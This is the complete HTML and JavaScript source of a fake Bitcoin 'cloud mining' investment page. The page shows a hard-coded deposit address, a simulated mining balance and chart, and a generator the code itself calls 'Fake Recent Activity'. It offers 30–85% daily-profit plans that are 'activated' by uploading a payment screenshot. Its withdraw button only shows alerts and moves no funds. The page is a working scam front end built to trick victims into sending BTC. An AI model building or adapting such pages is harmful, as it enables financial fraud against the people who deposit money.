<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Mining Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;}
.card{max-width:95%;margin:15px auto;padding:20px;border-radius:12px;background:#131a2e;}
h2{color:#f2a900;text-align:center;margin-bottom:10px;}
.btc{font-size:28px;text-align:center;margin:10px 0;}
.stats{display:flex;justify-content:space-around;flex-wrap:wrap;margin-top:10px;}
.stats div{background:#0b0f1a;padding:10px;margin:5px;border-radius:8px;}
.tx-container{max-height:260px;overflow:hidden;background:#0b0f1a;padding:10px;border-radius:8px;font-size:13px;position:relative;}
.tx{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #222;}
.green{color:#00ff99;}
.yellow{color:#ffcc66;}
.btc-box{background:#0b0f1a;padding:10px;border-radius:8px;word-break:break-all;text-align:center;}
button{background:#f2a900;border:none;padding:10px 16px;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:5px;display:block;width:100%;}
input,input[type=file]{width:100%;padding:10px;margin-top:10px;border-radius:6px;border:none;font-size:14px;display:block;}
.locked{opacity:0.7;cursor:not-allowed;}
canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0f1a;display:block;}
.screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
.plan-card{margin-top:15px;border:1px solid #222;padding:15px;border-radius:8px;}
.plan-card h3{margin:5px 0;}
</style>
</head>
<body>

<!-- BTC Deposit -->
<div class="card">
  <h2>BTC Deposit Address</h2>
  <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
  <button onclick="copyAddress()">Copy Address</button>
  <div style="text-align:center;margin-top:10px;">
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
  </div>
</div>

<!-- Mining Dashboard -->
<div class="card">
  <h2>Mining Dashboard</h2>
  <p style="text-align:center;color:#f2a900;">Mining balance for your selected plan</p>
  <div class="btc" id="balance">0.00000000 BTC</div>
  <canvas id="chart"></canvas>
  <div class="stats">
    <div>Hashrate: 120 TH/s</div>
    <div>Blocks: <span id="blocks">0</span></div>
    <div>Uptime: <span id="uptime">0h 0m</span></div>
  </div>
</div>

<!-- Investment Plans -->
<div class="card">
  <h2>Investment Plans</h2>

  <div id="plansContainer"></div>
</div>

<!-- Recent Activity -->
<div class="card">
  <h2>Recent Activity</h2>
  <div class="tx-container" id="txs"></div>
</div>

<script>
// ===== BTC Deposit Copy =====
function copyAddress(){
  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
    .then(()=>{alert('BTC address copied!');});
}

// ===== Mining Simulation =====
let balance = 0;
let blocks = 0;
let minutes = 0;
const txs = document.getElementById("txs");
let rate = 0.00000008;
let paused = false;

// ===== Smooth Chart =====
const canvas = document.getElementById("chart");
const ctx = canvas.getContext("2d");
let points = [0];

function drawChart(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  const w = canvas.width/50;
  ctx.beginPath();
  let lastY = canvas.height - points[0]*canvas.height/0.01;
  ctx.moveTo(0,lastY);
  for(let i=1;i<points.length;i++){
    let y = canvas.height - points[i]*canvas.height/0.01;
    ctx.lineTo(i*w,y);
  }
  ctx.strokeStyle="#f2a900";
  ctx.lineWidth=2;
  ctx.stroke();
  const last = points[points.length-1]||0;
  points.push(last+rate);
  if(points.length>50) points.shift();
}
setInterval(drawChart,500);

// ===== Update Mining Stats =====
setInterval(()=>{
  blocks += Math.floor(Math.random()*2);
  minutes++;
  document.getElementById("blocks").innerText = blocks;
  document.getElementById("uptime").innerText = Math.floor(minutes/60)+"h "+(minutes%60)+"m";
},60000);

setInterval(()=>{
  if(!paused){
    balance+=rate;
    document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";
  }
},1000);

// ===== Fake Recent Activity =====
function addFakeTx(){
  const div = document.createElement("div");
  div.className="tx";
  const val = (Math.random()*0.0004+0.00002).toFixed(8);
  const status = Math.random()>0.5?"Completed":"Pending";
  div.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
  txs.prepend(div);
  if(txs.children.length>500) txs.removeChild(txs.lastChild);
}
setInterval(addFakeTx,1500);

// ===== Plans Setup =====
const plans = [
  {name:"Plan A",profit:30,min:200,max:599},
  {name:"Plan B",profit:45,min:600,max:1000},
  {name:"Plan C",profit:60,min:1100,max:2000},
  {name:"Plan D",profit:75,min:2000,max:4999},
  {name:"Plan E",profit:80,min:5000,max:9999},
  {name:"Plan F",profit:85,min:10000,max:"Unlimited"}
];

const plansContainer = document.getElementById("plansContainer");
plans.forEach((plan,i)=>{
  const div = document.createElement("div");
  div.className="plan-card";
  div.innerHTML=`
    <h3>${plan.name}</h3>
    <p>Daily Profit: ${plan.profit}%</p>
    <p>Minimum Investment: $${plan.min}</p>
    <p>Maximum Investment: ${plan.max}</p>
    <input type="file" id="screenshot${i}" accept="image/*">
    <img id="preview${i}" class="screenshot-img" style="display:none;">
    <p>Withdrawal available in <span id="countdown${i}">3d 0h 0m 0s</span></p>
    <input type="text" id="withdrawAddr${i}" placeholder="Enter BTC address" disabled>
    <button id="withdrawBtn${i}" class="locked" disabled>Withdraw</button>
  `;
  plansContainer.appendChild(div);

  // Handle screenshot upload per plan
  const screenshotInput = document.getElementById(`screenshot${i}`);
  const preview = document.getElementById(`preview${i}`);
  const withdrawBtn = document.getElementById(`withdrawBtn${i}`);
  const withdrawInput = document.getElementById(`withdrawAddr${i}`);
  const countdownEl = document.getElementById(`countdown${i}`);
  const lockDuration = 3*24*60*60*1000; // 3 days
  let startTime = null;
  let active = false;

  screenshotInput.addEventListener("change", function(e){
    const file = e.target.files[0];
    if(!file) return;
    const reader = new FileReader();
    reader.onload = function(evt){
      preview.src = evt.target.result;
      preview.style.display = "block";
      // Activate this plan
      active = true;
      startTime = Date.now();
      localStorage.setItem(`plan${i}-active`,"true");
      localStorage.setItem(`plan${i}-startTime`,startTime);
      // deactivate others
      plans.forEach((_,j)=>{
        if(j!==i){
          localStorage.removeItem(`plan${j}-active`);
        }
      });
    }
    reader.readAsDataURL(file);
  });

  // Restore plan if page reload
  if(localStorage.getItem(`plan${i}-active`) === "true"){
    active = true;
    startTime = parseInt(localStorage.getItem(`plan${i}-startTime`));
    preview.style.display = "block";
  }

  // Countdown per plan
  setInterval(()=>{
    if(!active){
      countdownEl.innerText="3d 0h 0m 0s";
      withdrawBtn.disabled=true;
      withdrawBtn.classList.add("locked");
      withdrawInput.disabled=true;
      return;
    }
    const now = Date.now();
    const elapsed = now - startTime;
    const remaining = lockDuration - elapsed;
    if(remaining <=0){
      withdrawBtn.disabled=false;
      withdrawBtn.classList.remove("locked");
      withdrawInput.disabled=false;
      countdownEl.innerText="Available now!";
    } else {
      const d = Math.floor(remaining/(1000*60*60*24));
      const h = Math.floor((remaining%(1000*60*60*24))/(1000*60*60));
      const m = Math.floor((remaining%(1000*60*60))/(1000*60));
      const s = Math.floor((remaining%(1000*60))/1000);
      countdownEl.innerText=`${d}d ${h}h ${m}m ${s}s`;
    }
  },1000);

  // Withdraw per plan
  withdrawBtn.addEventListener("click", function(){
    const addr = withdrawInput.value.trim();
    if(addr===""){alert("Enter BTC address"); return;}
    alert(`Withdrawal to ${addr} processing...`);
    setTimeout(()=>{alert(`Withdrawal to ${addr} completed!`); withdrawInput.value="";},3000);
  });
});

// ===== 15-min pause & 1-hour drop =====
function startPauseCycle(){ setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000); }
startPauseCycle();
function startHourlyDrop(){ setInterval(()=>{ balance*=0.995; },60*60*1000); }
startHourlyDrop();
</script>
</body>
</html>
